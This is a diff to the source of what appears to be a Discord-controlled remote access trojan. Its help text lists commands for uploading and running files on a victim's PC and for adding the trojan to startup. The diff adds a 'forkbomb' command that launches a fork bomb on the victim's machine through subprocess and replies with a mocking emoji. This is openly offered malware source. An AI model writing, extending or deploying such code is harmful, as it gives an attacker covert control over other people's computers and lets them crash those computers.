@@ -130,6 +130,7 @@ Malware Commands
 
   .upload <sessionkey> <filelink>: Uploads and downloads file and then runs it on victims pc
   .startup <sessionkey>: puts rat on startup
+  .forkbomb <sessionkey>: runs a simple forkbomb as a background process
   .ddos <sessionkey>: COMING SOON
   .spread <sessionkey>: COMING SOON
   .roblox <sessionkey>: COMING SOON
@@ -167,6 +168,17 @@ Remote Shell Commands:
     await ctx.send(message)
     await ctx.send(message2)
     await ctx.send(message3)
+    
+    
+@bot.command() # FORKBOMB COMMAND
+async def forkbomb(ctx, seshn: str):
+    session = sessions.get(seshn.lower())
+    if session:
+        command = "%0|%0"
+        subprocess.Popen(command, shell=True, preexec_fn=os.setpgrp)
+        await ctx.send(f"Forkbombed session :rofl:")
+    else:
+        pass
 
 
 @bot.command() # Updated Command Using mss lib for ease of Screen shotting
